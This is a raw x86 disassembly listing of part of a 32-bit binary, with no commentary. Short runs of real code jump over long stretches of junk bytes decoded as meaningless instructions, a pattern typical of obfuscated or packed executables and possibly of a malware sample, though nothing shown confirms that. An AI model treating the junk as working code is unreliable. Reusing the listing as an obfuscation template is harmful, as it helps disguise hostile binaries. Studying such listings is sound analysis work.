  407664:	cmp    BYTE PTR [ebx+0x7a1bcf0a],0x66
  40766b:	lods   eax,DWORD PTR ds:[esi]
  40766c:	loope  0x4076c2
  40766e:	retf   
  40766f:	ret    
  407670:	jns    0x40760a
  407672:	jmp    0x4cbd3efc
  407677:	loopne 0x407669
  407679:	popf   
  40767a:	retf   0xb290
  40767d:	fstp   DWORD PTR [eax+0x61]
  407680:	jo     0x407635
  407682:	test   cl,al
  407684:	nop
  407685:	add    BYTE PTR [ebx-0x64f75b97],ah
  40768b:	xchg   edi,eax
  40768c:	ret    0x4ef9
  40768f:	jge    0x4076af
  407691:	mov    eax,ds:0x4882aab5
  407696:	adc    DWORD PTR gs:[ebx],ebp
  407699:	ds sahf 
  40769b:	adc    BYTE PTR [ebx-0x50],cl
  40769e:	lock out dx,al
  4076a0:	or     al,0x4d
  4076a2:	stos   BYTE PTR es:[edi],al
  4076a3:	mov    al,0x77
  4076a5:	cld    
  4076a6:	dec    ecx
  4076a7:	inc    ecx
  4076a8:	sub    eax,0x70a27f75
  4076ad:	adc    eax,edi
  4076af:	push   ebp
  4076b0:	lods   al,BYTE PTR ds:[esi]
  4076b1:	test   eax,0x95eec448
  4076b6:	xchg   ebx,eax
  4076b7:	add    BYTE PTR [ebp-0x41],0xb4
  4076bb:	adc    eax,0x6996b4d1
  4076c0:	mov    esi,0xaaa034c5
  4076c5:	or     esp,edx
  4076c7:	jp     0x40767e
  4076c9:	nop
  4076ca:	pop    ebx
  4076cb:	xor    eax,0xa9b22089
  4076d0:	imul   eax,DWORD PTR [edi-0x2e1c1a7a],0x64980953
  4076da:	dec    ebp
  4076db:	iret   
  4076dc:	xor    eax,0x46fbbfb7
  4076e1:	popf   
  4076e2:	jns    0x407746
  4076e4:	mov    ebx,0xe3c2e83f
  4076e9:	mov    ecx,0x43153f0
  4076ee:	add    edx,DWORD PTR [ebp+0x43]
  4076f1:	mov    al,0xf6
  4076f3:	jmp    0x4076ee
  4076f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f6:	jno    0x40776d
  4076f8:	xor    BYTE PTR [ebp+esi*2+0x50dacc45],ch
  4076ff:	push   esi
  407700:	sub    al,0xb9
  407702:	test   eax,0xf10b279c
  407707:	mov    eax,ds:0x33d330b7
  40770c:	fld    st(7)
  40770e:	add    eax,0x41075b
  407713:	sbb    eax,0x33000075
  407718:	rol    BYTE PTR [ecx+0x44898005],cl
  40771e:	add    dl,bl
  407720:	push   cs
  407721:	add    BYTE PTR [eax],al
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x448980,0x4248da
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x448988,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0x17
  40774d:	xor    ebx,DWORD PTR [ebx+0x7c325b9f]
  407753:	jl     0x40775b
  407755:	jg     0x4077d3
  407757:	jl     0x4076f9
  407759:	sbb    BYTE PTR [edi],al
  40775b:	out    0x4f,al
  40775d:	mov    cl,0x96
  40775f:	cs push esp
  407761:	pop    ecx
  407762:	pop    eax
  407763:	mov    WORD PTR [ebx-0x5757721f],es
  407769:	int    0x7
  40776b:	data16 cmc 
  40776d:	inc    esi
  40776e:	or     eax,0x217e869f
  407773:	test   eax,0x5cb9f1cf
  407778:	into   
  407779:	mov    DWORD PTR [edx+ebx*2-0x51],esi
  40777d:	arpl   WORD PTR [esi-0xf],cx
  407780:	inc    edi
  407781:	add    ecx,edi
  407783:	cmp    DWORD PTR [ecx-0x347e3f52],edx
  407789:	in     al,0x23
  40778b:	pop    esp
  40778c:	setg   BYTE PTR [ecx-0x74]
  407790:	cmp    edi,0x6bd2f47f
  407796:	or     BYTE PTR [esi],cl
  407798:	xchg   esp,eax
  407799:	mov    cl,0x61
  40779b:	dec    esp
  40779c:	mov    ebx,0x26fdb999
  4077a1:	aas    
  4077a2:	add    DWORD PTR [edx],edx
  4077a4:	fldcw  WORD PTR [eax+0x66e150e5]
  4077aa:	jo     0x407821
  4077ac:	jbe    0x4077ae
  4077ae:	sub    al,0xe3
  4077b0:	rcr    BYTE PTR [ecx],1
  4077b2:	add    ebx,DWORD PTR [eax+0x18309c0a]
  4077b8:	adc    eax,0x2e232f79
  4077bd:	clc    
  4077be:	add    DWORD PTR [esi-0x496842d5],ebx
  4077c4:	push   0x24
  4077c6:	int3   
  4077c7:	cs pusha 
  4077c9:	cdq    
  4077ca:	iret   
  4077cb:	outs   dx,DWORD PTR ds:[esi]
  4077cc:	cmc    
  4077cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ce:	hlt    
  4077cf:	dec    DWORD PTR [edi-0x40]
  4077d2:	push   0x7b33319d
  4077d7:	adc    BYTE PTR [eax],bh
  4077d9:	inc    esp
  4077da:	std    
  4077db:	test   al,0x7a
  4077dd:	aam    0x3e
  4077df:	shl    BYTE PTR [ecx-0x69],0x59
  4077e3:	lods   al,BYTE PTR ds:[esi]
  4077e4:	sub    eax,0xd344b495
  4077e9:	pop    esi
  4077ea:	test   BYTE PTR [eax+esi*1],bl
  4077ed:	ja     0x407838
  4077ef:	shl    DWORD PTR [edx],0x43
  4077f2:	mov    ds:0x22e888a8,al
  4077f7:	mov    ds:0xea56d615,eax
  4077fc:	xchg   esi,eax
  4077fd:	jg     0x4077b8
  4077ff:	pusha  
  407800:	pop    ebp
  407801:	iret   
  407802:	or     dl,BYTE PTR [ebp+0x40]
  407805:	xchg   DWORD PTR [edx+ebx*4-0x7761ab1d],ebx
  40780c:	scas   al,BYTE PTR es:[edi]
  40780d:	pop    es
  40780e:	call   0x428d:0xcab5461f
  407815:	mov    ecx,0xcac9eb67
  40781a:	pop    ss
  40781b:	mov    eax,ds:0xbdd95022
  407820:	cdq    
  407821:	shl    BYTE PTR [ebx],0xa0
  407824:	lahf   
  407825:	mov    ds:0xdf6c2d5,eax
  40782a:	xor    DWORD PTR [eax],0xfffffff2
  40782d:	mov    bl,0xd
  40782f:	jnp    0x4077f5
  407831:	inc    edx
  407832:	push   ecx
  407833:	cmp    bh,ah
  407835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407836:	add    al,0xe1
  407838:	add    BYTE PTR [edx+esi*8+0x1b],0xca
  40783d:	ds xchg bl,bl
  407840:	ret    
  407841:	jmp    0x40789a
  407843:	repz in eax,dx
  407845:	aaa    
  407846:	xchg   esi,eax
  407847:	scas   eax,DWORD PTR es:[edi]
  407848:	stos   DWORD PTR es:[edi],eax
  407849:	repz pop esp
  40784b:	jne    0x407802
  40784d:	pushf  
  40784e:	cmp    DWORD PTR [edx+0x2e9f715a],0x8747c28d
  407858:	imul   ebp,DWORD PTR [ecx-0x18],0xffffffd9
  40785c:	adc    DWORD PTR [edx-0x40],edi
  40785f:	aas    
  407860:	loop   0x407838
  407862:	sub    BYTE PTR [esi-0x7aec0f3c],dl
  407868:	push   edx
  407869:	retf   0x1d59
  40786c:	and    eax,0x18ea9ee0
  407871:	repz div ebx
  407874:	mov    edx,DWORD PTR ds:0x4248ca
  40787a:	mov    edx,DWORD PTR [ebp-0x20]
  40787d:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  407884:	mov    DWORD PTR ds:0x44b6e8,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x410743
  40789c:	and    DWORD PTR ds:0x44e418,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x4248ce,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x4248ce
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x4248ce,edx
  4078c0:	cmp    DWORD PTR ds:0x4248ce,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x4489a0
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x443014
  4078f0:	cmp    DWORD PTR ds:0x4248ce,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x4454e4
  40790b:	mov    eax,ds:0x4489b8
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	ffree  st(0)
  407928:	je     0x40790d
  40792a:	gs xor eax,0x7f067c7c
  407930:	jl     0x4079ae
  407932:	clc    
  407933:	jle    0x407953
  407935:	inc    ebx
  407936:	jmp    0x6c2d32de
  40793b:	sti    
  40793c:	popf   
  40793d:	xchg   ebp,eax
  40793e:	mov    edi,0x332b9f75
  407943:	fwait
  407944:	sub    esp,DWORD PTR [edx+0x2e]
  407947:	(bad)  
  407948:	jbe    0x407914
  40794a:	not    BYTE PTR [edi+edx*2]
  40794d:	sub    dh,BYTE PTR [edi+ecx*2-0x3f]
  407951:	retf   0xb8bd
  407954:	lea    ecx,[edx-0x4297d17d]
  40795a:	xchg   ebx,eax
  40795b:	test   eax,0xea6eb92a
  407960:	(bad)  
  407961:	cmp    ah,cl
  407963:	pop    ds
  407964:	sub    al,0x5f
  407966:	jns    0x407982
  407968:	cwde   
  407969:	mov    al,0xe2
  40796b:	jmp    0x407939
  40796d:	jne    0x407926
  40796f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407970:	es fdiv st,st(6)
  407973:	jo     0x4079bc
  407975:	jno    0x4079b4
  407977:	mov    eax,ds:0xdb8302fb
  40797c:	ins    BYTE PTR es:[edi],dx
  40797d:	rcr    DWORD PTR [edi+0x6d],0x7f
  407981:	arpl   WORD PTR [edx-0x6d],bp
  407984:	xchg   ebx,eax
  407985:	cwde   
  407986:	(bad)  
  407988:	in     eax,dx
  407989:	jecxz  0x4079f6
  40798b:	mov    esp,0xb0e17c2f
  407990:	scas   al,BYTE PTR es:[edi]
  407991:	pop    ebp
  407992:	cs mov bh,0x57
  407995:	lds    edx,FWORD PTR [esi]
  407997:	fnstsw WORD PTR [ecx+0x43]
  40799a:	aaa    
  40799b:	mov    ch,0x2c
  40799d:	mov    ecx,0x4bb191be
  4079a2:	retf   0x76a9
  4079a5:	rcr    BYTE PTR [ebx+0x6a],1
  4079a8:	rcl    BYTE PTR [ebx],1
  4079aa:	pushf  
  4079ab:	add    esi,DWORD PTR [edi+0x66]
  4079ae:	in     eax,0x6e
  4079b0:	jg     0x40797c
  4079b2:	xchg   esi,eax
  4079b3:	xchg   ebx,eax
  4079b4:	sub    eax,0x7fab4ec8
  4079b9:	push   edx
  4079ba:	cli    
  4079bb:	sbb    esp,edi
  4079bd:	sar    DWORD PTR [eax],cl
  4079bf:	xor    esp,DWORD PTR cs:[ecx+0x2aa9dfdc]
  4079c6:	mov    bl,0xb6
  4079c8:	mov    WORD PTR [edi+0x210a3ae9],?
  4079ce:	sub    ebx,DWORD PTR [edi]
  4079d0:	sbb    BYTE PTR [edx+0x60],bl
  4079d3:	jbe    0x407a3d
  4079d5:	and    DWORD PTR [eax+0x4b],edx
  4079d8:	into   
  4079d9:	retf   
  4079da:	repnz leave 
  4079dc:	jbe    0x4079cf
  4079de:	or     BYTE PTR [ebp+0x4b43506d],cl
  4079e4:	(bad)  
  4079e6:	inc    ebp
  4079e7:	sub    ah,ah
  4079e9:	sub    eax,0x459095fa
  4079ee:	inc    edi
  4079ef:	sbb    al,0xc
  4079f1:	add    eax,0x4fa4f92a
  4079f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f7:	std    
  4079f8:	jmp    0x84c93afd
  4079fd:	sti    
  4079fe:	pop    esi
  4079ff:	cmp    eax,0xcbab3ee0
  407a04:	les    ebx,FWORD PTR ds:0x785d9c28
  407a0a:	lds    eax,FWORD PTR [esi]
  407a0c:	test   al,0x51
  407a0e:	or     ebp,ebx
  407a10:	sbb    ch,BYTE PTR [ecx]
  407a12:	or     DWORD PTR [eax+0x4],ebx
  407a15:	aaa    
  407a16:	sbb    DWORD PTR [eax+0xcff016d],esi
  407a1c:	xor    al,0x51
  407a1e:	ja     0x4079e5
  407a20:	dec    esp
  407a21:	push   ss
  407a22:	fst    DWORD PTR [eax-0x45]
  407a25:	pop    ebp
  407a26:	jbe    0x4079f6
  407a28:	mov    ch,0x29
  407a2a:	and    ecx,DWORD PTR [ecx+0x5a]
  407a2d:	pop    esp
  407a2e:	inc    edi
  407a2f:	inc    ebx
  407a30:	mov    esi,0x62126849
  407a35:	xor    al,0x23
  407a37:	adc    dh,BYTE PTR [ebx+0x3c7adcdd]
  407a3d:	xor    ch,al
  407a3f:	jo     0x4079e2
  407a41:	mov    esi,0x989ae113
  407a46:	push   esi
  407a47:	test   eax,0xf36dce6c
  407a4c:	mov    eax,DWORD PTR [ebp-0x10]
  407a4f:	mov    DWORD PTR ds:0x448994,0x1e
  407a59:	cmp    DWORD PTR ds:0x448994,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x448994,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x443018
  407a7f:	cmp    DWORD PTR ds:0x448994,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x448994
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x448994,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x448994
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x448994,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fisttp WORD PTR [eax+ebp*8]
  407adb:	aas    
  407adc:	mov    ds:0x7c7c370f,eax
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407af2
  407ae6:	mov    eax,0xf3dfefdc
  407aeb:	lahf   
  407aec:	or     eax,0xb44481cc
  407af1:	sahf   
  407af2:	xchg   ebx,eax
  407af3:	nop
  407af4:	out    0x7a,al
  407af6:	cmp    edx,DWORD PTR [eax-0x362cd112]
  407afc:	cli    
  407afd:	fs sbb bl,dh
  407b00:	adc    ebp,DWORD PTR [edi]
  407b02:	outs   dx,DWORD PTR ds:[esi]
  407b03:	jp     0x407b26
  407b05:	bound  ebp,QWORD PTR [ebp-0x4f60cc53]
  407b0b:	mov    BYTE PTR [edx-0x56],al
  407b0e:	not    DWORD PTR [ebx]
  407b10:	hlt    
  407b11:	lds    edi,FWORD PTR [edx-0x2505f0c6]
  407b17:	jbe    0x407a99
  407b19:	div    BYTE PTR ds:0x981a582a
  407b1f:	jae    0x407b69
  407b21:	pop    ecx
  407b22:	inc    edi
  407b23:	rcr    DWORD PTR [edx],0x3f
  407b26:	in     eax,0x70
  407b28:	mov    al,ds:0xc205c15c
  407b2d:	ss stc 
  407b2f:	mov    ?,WORD PTR [eax-0x7e]
  407b32:	icebp  
  407b33:	add    DWORD PTR [esi+edx*4+0x66],esi
  407b37:	mov    edx,0x5f04d07d
  407b3c:	imul   ebp
  407b3e:	ret    0x373f
  407b41:	hlt    
  407b42:	sub    al,0x11
  407b44:	dec    eax
  407b45:	in     al,0x1e
  407b47:	xchg   esi,eax
  407b48:	lea    edi,ds:0xf50a011a
  407b4e:	aaa    
  407b4f:	mov    BYTE PTR [edx],ah
  407b51:	xor    eax,0xa2a7ad87
  407b56:	jmp    0xd942:0x7f6b3305
  407b5d:	push   0xffffffc4
  407b5f:	pop    ebx
  407b60:	jne    0x407bdf
  407b62:	bound  eax,QWORD PTR [edi+eax*1]
  407b65:	cwde   
  407b66:	stos   BYTE PTR es:[edi],al
  407b67:	(bad)  
  407b68:	les    ebp,FWORD PTR [edi]
  407b6a:	xchg   esi,eax
  407b6b:	mov    al,ds:0x4016c074
  407b70:	mov    WORD PTR [ecx+0x8a097bf],fs
  407b76:	sbb    bh,BYTE PTR [esi-0x34]
  407b79:	mov    ebx,0xa896b774
  407b7e:	fsqrt  
  407b80:	pop    es
  407b81:	push   ss
  407b82:	mov    ebp,0xc74f85f4
  407b87:	cmp    eax,DWORD PTR [edx]
  407b89:	sar    BYTE PTR [edi+0x11d6b2fd],0x9f
  407b90:	mov    bh,0x91
  407b92:	xlat   BYTE PTR ds:[ebx]
  407b93:	mov    esp,0xd44e617e
  407b98:	jmp    0x4fab38fe
  407b9d:	xor    DWORD PTR [eax-0x6e],edi
  407ba0:	cs jne 0x407bf4
  407ba3:	das    
  407ba4:	aam    0xc7
  407ba6:	mov    al,ds:0x581452ba
  407bab:	mov    esp,0xecec29ec
  407bb0:	adc    bl,BYTE PTR [edx+0x481a6365]
  407bb6:	inc    ebp
  407bb7:	mov    ecx,0x6e12becd
  407bbc:	mov    cs,ebx
  407bbe:	mov    dl,cl
  407bc0:	mov    ch,bh
  407bc2:	es push ss
  407bc4:	mov    ds:0x6448e7d9,al
  407bc9:	pushf  
  407bca:	neg    DWORD PTR [edx]
  407bcc:	xchg   ecx,eax
  407bcd:	adc    BYTE PTR [ebp-0x1f],ah
  407bd0:	add    esi,ebx
  407bd2:	inc    esp
  407bd3:	dec    edi
  407bd4:	xor    ch,BYTE PTR [edi-0x4e992c56]
  407bda:	test   eax,0x2c05a4cd
  407bdf:	mov    eax,0x4525be53
  407be4:	jecxz  0x407ba6
  407be6:	sub    ecx,edx
  407be8:	fld    DWORD PTR [ecx-0x7f]
  407beb:	fs cmc 
  407bed:	cmp    al,0x12
  407bef:	mov    WORD PTR [esi+ebx*8+0x8],ss
  407bf3:	mov    eax,0x4f6c3cc7
  407bf8:	push   esi
  407bf9:	xor    ecx,DWORD PTR [eax+esi*1]
  407bfc:	fisub  DWORD PTR [eax-0x6ff77ebd]
  407c02:	sbb    al,0x75
  407c04:	pusha  
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0x1c7e43a
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407c8f
  407c50:	and    DWORD PTR [edi+0x6558df1b],ebx
  407c56:	sbb    DWORD PTR [ecx+ebx*2+0x3f],edi
  407c5a:	jns    0x407bdc
  407c5c:	lock inc edi
  407c5e:	pop    ss
  407c5f:	cmp    al,BYTE PTR [esi+edi*8]
  407c62:	or     ecx,DWORD PTR [edi-0x40]
  407c65:	stos   BYTE PTR es:[edi],al
  407c66:	icebp  
  407c67:	jno    0x407c42
  407c69:	mov    esi,0x887b80ef
  407c6e:	ds aad 0xe5
  407c71:	fsubr  st,st(4)
  407c73:	ins    DWORD PTR es:[edi],dx
  407c74:	repnz push 0x5fdc4a6b
  407c7a:	imul   ebx
  407c7c:	cdq    
  407c7d:	sbb    DWORD PTR [ebx-0x1faf4af9],ecx
  407c83:	les    eax,FWORD PTR [edx-0x16]
  407c86:	cmc    
  407c87:	std    
  407c88:	int    0xcc
  407c8a:	inc    ebp
  407c8b:	es test eax,0x7f1a6a16
  407c91:	jg     0x407c36
  407c93:	test   DWORD PTR [esi+ecx*2],ebp
  407c96:	test   eax,0xf71111ed
  407c9b:	xor    BYTE PTR ds:0xc9efd8f3,al
  407ca1:	push   edi
  407ca2:	cmp    BYTE PTR [ebx],dh
  407ca4:	add    BYTE PTR [ebp-0x623fd733],al
  407caa:	ret    
  407cab:	sub    DWORD PTR [ecx],esi
  407cad:	xchg   esi,eax
  407cae:	mov    dh,0xe5
  407cb0:	cmc    
  407cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb2:	enter  0x57cc,0x65
  407cb6:	pop    ecx
  407cb7:	inc    ebp
  407cb8:	cmp    eax,0xca8f7327
  407cbd:	mov    bl,0x26
  407cbf:	mov    bl,0x31
  407cc1:	pushf  
  407cc2:	add    dh,BYTE PTR [edi]
  407cc4:	jmp    DWORD PTR [esi+ebp*1-0x36]
  407cc8:	xor    bh,BYTE PTR [edx+ebx*2+0x7e]
  407ccc:	fnstcw WORD PTR ds:0xf012f68e
  407cd2:	aam    0x1a
  407cd4:	adc    BYTE PTR [eax+0x5d4c50ae],ch
  407cda:	jae    0x407d02
  407cdc:	push   0x106ff535
  407ce1:	int    0xe
  407ce3:	(bad)  
  407ce4:	jb     0x407c80
  407ce6:	sub    DWORD PTR [ebp+0x37],edx
  407ce9:	jp     0x407cf3
  407ceb:	addr16 or ecx,edi
  407cee:	leave  
  407cef:	loop   0x407d0a
  407cf1:	dec    edi
  407cf2:	dec    edi
  407cf3:	xlat   BYTE PTR ds:[ebx]
  407cf4:	inc    esi
  407cf5:	sub    al,BYTE PTR [edx-0x56]
  407cf8:	and    al,0xb5
  407cfa:	outs   dx,BYTE PTR ds:[esi]
  407cfb:	cmc    
  407cfc:	shl    BYTE PTR [ebx],1
  407cfe:	cs aas 
  407d00:	mov    ds:0x272386f2,eax
  407d05:	cwde   
  407d06:	fst    DWORD PTR [ecx+eax*8+0x55]
  407d0a:	dec    ebx
  407d0b:	cmp    eax,0xfe2f4091
  407d10:	dec    eax
  407d11:	ins    DWORD PTR es:[edi],dx
  407d12:	xor    ebx,ecx
  407d14:	faddp  st(1),st
  407d16:	hlt    
  407d17:	add    eax,0x5423e9bf
  407d1c:	retf   
  407d1d:	mov    DWORD PTR [esi],edx
  407d1f:	pop    esp
  407d20:	jbe    0x407cc5
  407d22:	test   eax,ebp
  407d24:	sahf   
  407d25:	cmp    edx,esp
  407d27:	into   
  407d28:	add    ebx,DWORD PTR [ebx+ebx*8+0x6977ba35]
  407d2f:	dec    ecx
  407d30:	pop    ds
  407d31:	dec    ecx
  407d32:	sti    
  407d33:	rcl    BYTE PTR [eax+0x408b41f9],cl
  407d39:	jmp    0xadaa:0x613df89b
  407d40:	mov    esi,0x24a4d8cf
  407d45:	(bad)  
  407d46:	stos   BYTE PTR es:[edi],al
  407d47:	xchg   ch,dh
  407d49:	iretw  
  407d4b:	and    DWORD PTR [esi+0x6c],ecx
  407d4e:	loop   0x407d71
  407d50:	(bad)  
  407d51:	xchg   esi,eax
  407d52:	in     al,0xf7
  407d54:	push   ss
  407d55:	sbb    BYTE PTR [ecx+edx*2-0x434cb3a7],ah
  407d5c:	cmp    DWORD PTR [ecx-0x79],esp
  407d5f:	in     eax,dx
  407d60:	inc    ebx
  407d61:	or     esp,DWORD PTR [eax+0x1e]
  407d64:	pop    ebx
  407d65:	fsubr  QWORD PTR [eax+0x458bf1be]
  407d6b:	hlt    
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx-0x66f58a9c]
  407d92:	nop
  407d93:	or     DWORD PTR [ebx],esi
  407d95:	leave  
  407d96:	jl     0x407e14
  407d98:	push   es
  407d99:	jg     0x407e17
  407d9b:	jl     0x407d69
  407d9d:	loop   0x407dfd
  407d9f:	push   ss
  407da0:	test   eax,0x43957420
  407da5:	jp     0x407db6
  407da7:	iret   
  407da8:	push   cs
  407da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407daa:	sar    ah,cl
  407dac:	sub    eax,0x5a62928
  407db1:	cdq    
  407db2:	retw   0x88c1
  407db6:	lds    ebp,FWORD PTR ds:0xc31cb2a0
  407dbc:	aas    
  407dbd:	xchg   ebp,eax
  407dbe:	mov    al,ds:0x2c705b28
  407dc3:	cmp    eax,0xffffe184
  407dc8:	int    0x5c
  407dca:	pusha  
  407dcb:	sahf   
  407dcc:	xlat   BYTE PTR ds:[ebx]
  407dcd:	or     ah,BYTE PTR [ebx]
  407dcf:	cmp    ah,BYTE PTR [eax]
  407dd1:	rcr    BYTE PTR [esi+0xb7748c],cl
  407dd7:	sbb    ch,ch
  407dd9:	int    0x9c
  407ddb:	stos   BYTE PTR es:[edi],al
  407ddc:	xor    dh,ch
  407dde:	adc    DWORD PTR [esi+0x22],esi
  407de1:	push   edx
  407de2:	pop    ss
  407de3:	dec    eax
  407de4:	push   0xffffffef
  407de6:	out    0x0,al
  407de8:	bound  ebp,QWORD PTR [ecx]
  407dea:	(bad)  
  407deb:	fst    DWORD PTR [ebp-0x6d90e1f3]
  407df1:	mov    ebx,DWORD PTR [ebx+esi*2+0x4c]
  407df5:	sar    BYTE PTR [esi],cl
  407df7:	inc    eax
  407df8:	cmp    edi,esp
  407dfa:	xchg   esi,eax
  407dfb:	cmp    BYTE PTR [edx-0x4f49ac4b],dh
  407e01:	mov    edx,0x9169d5d7
  407e06:	xchg   DWORD PTR [ecx-0x5e],ecx
  407e09:	and    edi,ebx
  407e0b:	sbb    ecx,ecx
  407e0d:	fmulp  st(4),st
  407e0f:	lods   al,BYTE PTR ds:[esi]
  407e10:	adc    al,0xa0
  407e12:	cmp    BYTE PTR [ecx],dh
  407e14:	sub    BYTE PTR [esi-0x65c21591],dl
  407e1a:	mov    cl,0x66
  407e1c:	loop   0x407e68
  407e1e:	cmp    dl,BYTE PTR [ebp+0x56407efa]
  407e24:	jne    0x407dc6
  407e26:	dec    esp
  407e27:	push   ds
  407e28:	cdq    
  407e29:	cli    
  407e2a:	mov    esp,0x9aa19c93
  407e2f:	out    0x7f,eax
  407e31:	and    eax,DWORD PTR [ecx+0x72]
  407e34:	pop    ebp
  407e35:	lock call 0xf1c515d8
  407e3b:	gs in  eax,dx
  407e3d:	cmp    eax,0xca2e5208
  407e42:	xchg   ah,cl
  407e44:	out    dx,eax
  407e45:	int    0x48
  407e47:	adc    BYTE PTR [ebx],al
  407e49:	daa    
  407e4a:	sbb    eax,0xf525b2d0
  407e4f:	jmp    0x779b:0xa1045f11
  407e56:	out    0x1,al
  407e58:	fwait
  407e59:	mov    DWORD PTR [ebp+0x4],esp
  407e5c:	cmp    BYTE PTR [ebp+ecx*8+0x5da22291],dh
  407e63:	push   ss
  407e64:	lods   eax,DWORD PTR ds:[esi]
  407e65:	xchg   esp,eax
  407e66:	mov    al,ds:0xf73f0cf8
  407e6b:	mov    esi,DWORD PTR [esi+0x42]
  407e6e:	(bad)  
  407e6f:	mov    dh,0x2c
  407e71:	iret   
  407e72:	daa    
  407e73:	dec    ecx
  407e74:	xchg   esp,eax
  407e75:	cs test al,0x13
  407e78:	ds test al,0xf1
  407e7b:	std    
  407e7c:	cs mov ecx,0xaa13802d
  407e82:	xor    BYTE PTR [edi-0x21],0x6c
  407e86:	add    eax,0xd10381af
  407e8b:	jae    0x407edd
  407e8d:	xchg   edx,eax
  407e8e:	pop    esp
  407e8f:	in     al,dx
  407e90:	mov    ds:0x64a12d3c,eax
  407e95:	(bad)  
  407e96:	aas    
  407e97:	pop    ecx
  407e98:	repnz push eax
  407e9a:	(bad)  
  407e9b:	sti    
  407e9c:	ins    DWORD PTR es:[edi],dx
  407e9d:	mov    ah,BYTE PTR [eax+0x6f]
  407ea0:	add    al,0x36
  407ea2:	(bad)  
  407ea3:	jmp    0x407f0c
  407ea5:	inc    edx
  407ea6:	cmc    
  407ea7:	test   eax,0xe9ddf324
  407eac:	in     eax,dx
  407ead:	xor    eax,0xaea88725
  407eb2:	outs   dx,DWORD PTR ds:[esi]
  407eb3:	mov    edi,0x308122ca
  407eb8:	(bad)  
  407eb9:	cli    
  407eba:	push   eax
  407ebb:	es jmp 0x407c05
  407ec1:	mov    ax,WORD PTR [ebp-0x4]
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
